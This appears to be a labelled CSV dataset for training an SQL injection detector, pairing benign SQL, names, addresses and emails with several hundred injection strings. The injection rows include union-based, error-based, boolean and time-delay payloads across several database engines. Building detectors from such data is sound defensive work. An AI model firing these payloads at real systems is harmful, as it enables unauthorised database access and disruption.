Query,Label
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",1
"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,1
"-6389"" union all select 2355,2355,2355,2355,2355--",1
"   SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union  FROM highway",0
2308,0
1.21588E+15,0
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",1
adolphe,0
" end and ""xlvn""  =  ""xlvn",1
26707809w,0
86943454g,0
"1%""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT TOP 50 PERCENT * FROM combination,0
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1
SELECT TOP 3 * FROM hardly WHERE interior = 'cannot',0
SELECT * FROM now  WHERE therefore NOT LIKE '[learn]%',0
alconchel,0
-6327'   )    )    union all select 2685--,1
07951538r,0
1'+  (  select 'wsjk' where 3291  =  3291,1
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1
exec  (  @s  ) ,1
geffner-schoo@bacoespecialseleccin.bm,0
SELECT * FROM agree WHERE impossible = 'fur',0
"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM breeze FETCH FIRST 3 ROWS ONLY,0
"1"" where 8672  =  8672 union all select null,null#",1
SELECT TOP 3 * FROM heavy SELECT * FROM slept 3SELECT * FROM pleasant,0
"  SELECT hospital AS double, saved AS [desk]  FROM musical",0
SELECT * FROM port WHERE goes NOT BETWEEN 'some' AND 'underline',0
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0
"calle pea 49, 9?b",0
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM accurate WHERE branch BETWEEN 'handsome' AND 'although',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",1
"1   )    )     )   union all select null,null,null,null,null--",1
abs hosta,0
08109487d,0
SELECT string FROM boy UNION SELECT bit FROM occur ORDER BY theory,0
"1""   )    )     )   union all select null,null--",1
ges,0
SELECT thy ( s )  FROM engine UNION,0
"-4025"" or 3038  =  3038",1
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow,0
arima@hormigon-impreso.nu,0
"  SELECT BINARY ""HELLO""  =  ""hello"";",0
almedina,0
-6412%' or 4065  =  5815 and '%'  =  ',1
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",1
"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",1
DELETE FROM shinning,0
SELECT TOP 3 * FROM race,0
angeles jarama,0
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1,0
" SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID WHERE LastName  =  'Davolio' OR LastName  =  'Fuller' GROUP BY LastName HAVING  COUNT ( Orders.OrderID )  > 25;",0
arrazua-ubarrundia,0
SELECT AVG ( indicate )  FROM quietly  SELECT SUM ( smooth ) ,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  2710",0
"c/ afluente, 82",0
67663365x,0
1  )   where 2307  =  2307,1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1
"  UPDATE women SET baseball =  'person', City =  'traffic' WHERE small =  boat",0
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0
03621656f,0
"-7146"" where 6431  =  6431 or 8548  =  5549--",1
"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1
SELECT MIN ( occasionally )  AS courage FROM current,0
SELECT hay ( s )  FROM congress UNION,0
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1
"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-5726%""   )    )    or 6872  =  6872 and    (    (   ""%""  =  """,1
31587,0
"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1
SELECT * FROM simply WHERE settle = 'another'  AND City = 'nation',0
"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",1
 UPDATE return SET camera = 'pond'WHERE of = 'such',0
houstin@maxitienda.zr,0
36930027p,0
barlovento,0
1  )   and sleep  (  5  )  #,1
"SELECT * FROM grew WHERE speech BETWEEN ""favorite"" AND    ""vegetable""",0
SELECT * FROM result ORDER BY moving DESC,0
1'   )    )    and 3814  =  4272--,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",1
 (  8362  =  9139  )  *9139,1
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-5245""   )    )     )   union all select 8106,8106,8106#",1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
SELECT * FROM create  WHERE heading = send,0
maggee,0
gwenda,0
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief,0
18347,0
cracoviano,0
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
1 where 6494  =  6494 and 8463  =  2760,1
SELECT Count ( * )  AS adult,0
1  )   where 4548  =  4548 and 9198  =  9198--,1
SELECT * FROM pink WHERE string BETWEEN 'land' AND 'bat',0
"c/ virgen de la almudena, 61 12?c",0
SELECT * FROM fed WHERE lion = 'cowboy' LIMIT 3,0
"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """,1
SELECT COUNT ( early ) FROM your,0
SELECT * FROM using WHERE corner BETWEEN 'bill' AND 'off',0
SELECT invented ( s )  FROM rays UNION,0
"molinos, los",0
"iif  (  1157  =  4542,1,1/0  )  ",1
SELECT * FROM monkey WHERE basket = 'corn' LIMIT 3,0
"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1
SELECT EXP ( 2 ) ;,0
"1""   )    )    union all select null,null--",1
SELECT MIN ( carefully )  AS dull FROM remarkable,0
62128531b,0
SELECT airplane ( s )  FROM jump UNION,0
1' and 2006  =  2006,1
"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
"1' where 4272  =  4272 union all select null,null,null,null#",1
"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
17489,0
"   SELECT right, sea, row FROM purple WHERE teach  IS NULL",0
c/ doctores lasso simarro 30,0
SELECT store ( s )  FROM mail,0
1o92r,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",1
ohala,0
"  SELECT affect AS contain, draw AS [common]  FROM yesterday",0
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1
SELECT * FROM  ( SELECT machine FROM combine ) ,0
5.25502E+15,0
"   SELECT shoot,state,trunk,possible,knew     (  (  warn JOIN does ON truth.kept =  shall.victory )   INNER JOIN proveON Orders.fallen =  hide.zooID ) ",0
lovejoy,0
"   SELECT trap,chosen,eventually,journey,job     (  (  build JOIN grandmother ON satisfied.salt =  studied.eventually )   INNER JOIN perfectON Orders.coast =  whom.gentleID ) ",0
"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1
"  UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass",0
"select pg_sleep  (  5  )   and ""%""  =  """,1
vlez acejas,0
11690,0
randera,0
1'+  (  select trte where 9173  =  9173 and 2006  =  2006,1
"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
spradlin@pcvirus.dz,0
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1
SELECT * FROM vertical FETCH FIRST 50 PERCENT ROWS ONLY,0
bolkan@directoriogratuito.int,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""weku"" like ""weku",1
"1""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1.44E+15,0
ibero saborit,0
nogueira de ramun,0
select pg_sleep  (  5  )  --,1
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1%""   )    )     )   and 4595  =  4595#",1
"  SELECT sold,fully FROM sugar WHERE figure = 'symbol' UNION SELECT garage, had FROM carbon",0
6.27383E+15,0
bscones de ojeda,0
SELECT notice ( s )  FROM again SELECT group FROM however,0
strucak@cortell.cat,0
SELECT * FROM still WHERE    NOT particular = 'sometime',0
vries,0
trish,0
SELECT TOP 3 * FROM each WHERE blind = 'ought' SELECT * FROM merely,0
SELECT * FROM  ( SELECT start FROM cowboy ) ,0
SELECT smile,0
SELECT * FROM together WHERE somehow = 'previous',0
philipp.castella@biopoint.vc,0
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
SELECT TOP 3 * FROM writer SELECT * FROM truth 3SELECT * FROM court,0
lev@ozlon.ke,0
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'hube'  =  'hube",1
inescourt7@citycvs.mil,0
SELECT * FROM practice WHERE waste = 'board'  AND City = 'control',0
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbcf5ac6f5bc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"calle juana ibarborou 134,",0
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
" SELECT column_name ( s )  FROM saw,feature",0
1'+  (  select 'vjoj' where 5348  =  5348,1
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'vjnf' like 'vjnf",1
SELECT * FROM  ( SELECT degree FROM hand ) ,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",1
8.00405E+14,0
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",1
SELECT COUNT ( dawnID ) FROM block,0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
-8234'   )    )     )   or 9323  =  9323#,1
9637,0
SELECT * FROM island FETCH FIRST 50 PERCENT ROWS ONLY,0
"consolacion 92, 12?h",0
cos6rio,0
1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1""  )   where 1410  =  1410",1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,1
SELECT sudden FROM cause UNION SELECT hospital FROM straw ORDER BY pleasure,0
64462042b,0
"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,0
"1"" where 8734  =  8734",1
"   SELECT strike, neck+ ', ' + thousand+ ' ' + medicine+ ', ' + arrive AS start  FROM experiment",0
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0
1'+  (  select tdkt where 4535  =  4535,1
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
1' and 5967  =  4184#,1
SELECT TOP 3 * FROM goose WHERE nearest = 'doubt' SELECT * FROM neighborhood,0
SELECT SIN ( 2 ) ;,0
1'  )   and 2305  =  1934,1
"  SELECT highway AS think, passage AS [cold]  FROM planning",0
SELECT * FROM pen WHERE NOT curious = 'vessels'  AND NOT willing = 'thought',0
torrande gaitan,0
SELECT * FROM breeze WHERE accept = 'pet'  OR out = 'gave',0
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
mariabel,0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + ISNULL ( UnitsOnOrder, 0  )  )   FROM Products;",0
san salvador,0
45810,0
SELECT AVG ( instrument )  FROM construction  SELECT SUM ( finally ) ,0
SELECT MIN ( stream )  AS dance FROM three,0
"-5507' or elt  (  1032  =  1032,3623  )   and 'ndqw'  =  'ndqw",1
SELECT AVG ( safety ) FROM able,0
SELECT * FROM someone FETCH FIRST 50 PERCENT ROWS ONLY,0
calle federico mompou 144 11-d,0
SELECT * FROM gulf WHERE stream IN  ( SELECT flame FROM got ) ,0
21710,0
fit irizibar,0
SELECT * FROM generally,0
SELECT * FROM dirty WHERE listen BETWEEN 'trick' AND 'ordinary',0
"1%"" union all select null,null,null,null,null,null,null#",1
darnall,0
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,1
"iif  (  2205  =  4764,1,1/0  )  ",1
SELECT AVG ( split ) FROM try SELECT SUM ( knife ) ,0
"1%""   )    )    waitfor delay '0:0:5'--",1
92793320g,0
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",1
18995930t,0
grodecki,0
"  UPDATE bare SET bigger =  'six', City =  'plus' WHERE common =  wind",0
" SELECT column_name ( s )  FROM outside,inch",0
bertilia,0
duplan,0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
SELECT * FROM must WHERE protection = 'test'  OR bee = 'arrive',0
SELECT * FROM street FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM garage,0
SELECT TOP 3 * FROM its WHERE circus = 'pack',0
"  SELECT Orders.seldomrID, Employees.occur, Employees.income FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.weekID ORDER BY Orders.cowboyID",0
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm",1
1emat98,0
"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",1
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )  ",0
"   SELECT move, face, telephoneFROM how WHERE model  IS NOT NULL",0
select   (  case when   (  1354  =  7529  )   then 1354 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM cap WHERE shape BETWEEN lie09/01/1996blanket AND farmer15/31/1996position,0
66750565b,0
9159,0
SELECT COUNT ( threeID ) FROM foreign,0
SELECT * FROM  ( SELECT life FROM probably ) ,0
SELECT * FROM real ORDER BY parts,0
bablica,0
yarela,0
raudres,0
"SELECT * FROM dull WHERE nuts BETWEEN ""worth"" AND    ""given""",0
"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",1
SELECT * FROM clear WHERE slipped = 'building'  OR aware = 'colony',0
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",1
0a0t4d2r,0
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",1
SELECT AVG ( cause ) FROM weather SELECT SUM ( dig ) ,0
2.94331E+14,0
DELETE FROM roof WHERE heat = 'mine',0
SELECT AVG ( notice ) FROM sets,0
"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",1
"-3445 union all select 5505,5505,5505--",1
end-- podi,1
"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '",1
1   )    )    as kiqk where 7366  =  7366 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"INSERT INTO move  ( try, think, within )  VALUES  ( 'conversation', 'separate', 'calm' )  ",0
methi,0
SELECT COUNT ( burstID ) FROM pocket,0
/**/or/**/1/**/  =  /**/1,1
"1%""  )   union all select null,null,null,null--",1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",1
"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",1
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
gladiolos 30,0
5i852469,0
maula,0
valdeprados,0
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",1
"   SELECT COUNT ( universe ) , hungry FROM log BY stretch",0
"1""  )   where 9248  =  9248",1
gaspard-birgel@indorec.kr,0
"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1
-9841 where 4612  =  4612 union all select 4612--,1
"  UPDATE hat SET fuel =  'meat', City =  'differ' WHERE signal =  root",0
SELECT AVG ( Price ) FROM sail,0
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1
ratnam,0
SELECT DISTINCT frame FROM write,0
SELECT COUNT ( six )  FROM here,0
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
cholgua,0
SELECT AVG ( truth )  FROM slope  SELECT SUM ( fully ) ,0
SELECT * FROM biggest,0
SELECT * FROM six WHERE needs = 'pleasant'  AND City = 'breathe',0
SELECT Count ( * )  AS figure,0
SELECT * FROM new WHERE cloth = 'daughter'  AND City = 'given',0
9.16169E+15,0
SELECT MIN ( said )  AS deal FROM statement,0
"1"" where 1166  =  1166",1
urbon,0
SELECT * FROM feet WHERE hearing NOT LIKE '[ought]%',0
12466,0
"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",1
2.04422E+15,0
-5547' or 9323  =  9323#,1
"-5425 where 5933  =  5933 union all select 5933,5933,5933--",1
 or 3  =  3 --,1
sempronia,0
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",1
or 'a'  =  'a,1
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1
SELECT * FROM CustomersWHERE Country = 'Germany'FETCH FIRST 3 ROWS ONLY;,0
93tip72ar,0
SELECT * FROM alive WHERE Price NOT BETWEEN 10 AND 20,0
8589,0
SELECT * FROM society,0
"olivar, 174,",0
castillejo de meslen,0
SELECT COUNT ( youth )  FROM hide,0
"c/ zilbetiko monasterioaren, s/n,",0
SELECT * FROM good WHERE real IN  ( SELECT simply FROM introduced ) ,0
" SELECT * FROM seems ORDER BY feathers, wave",0
adelina,0
tristan,0
"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1""  )   where 8571  =  8571 and elt  (  4249  =  4249,7259  )  --",1
a8o8decer,0
"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM  ( SELECT view FROM shallow ) ,0
" SELECT * FROM eat ORDER BY forest, alone",0
16300,0
"  SELECT SUBTIME ( ""10:24:21"", ""300"" ) ;",0
1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
SELECT window,0
SELECT sing ( s )  FROM deeply LEFT JOIN,0
-8359  )   where 4430  =  4430 or 6872  =  6872--,1
SELECT * FROM row ORDER BY change DESC,0
"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",1
dotan,0
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
"1'   )    )    union all select null,null,null,null,null,null#",1
rabascall,0
pueblica de valverde,0
almagrar,0
select * from users where id  =  1 or !<@ or 1  =  1 -- 1,1
SELECT COUNT ( told ) FROM slowly,0
"   SELECT led, paragraph+ ', ' + everyone+ ' ' + write+ ', ' + park AS zulu  FROM original",0
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
SELECT * FROM particular,0
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1
cimorro,0
"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
FROM  ( SELECT DISTINCT map FROM run ) ,0
latin,0
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1
SELECT * FROM equally WHERE fur NOT LIKE 'were%',0
SELECT DISTINCT circle FROM activity,0
"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",1
SELECT * FROM race ORDER BY war DESC,0
SELECT COUNT ( possibly )  FROM rose,0
"select * from generate_series  (  3827,3827,case when   (  3827  =  7095  )   then 1 else 0 end  )   limit 1--",1
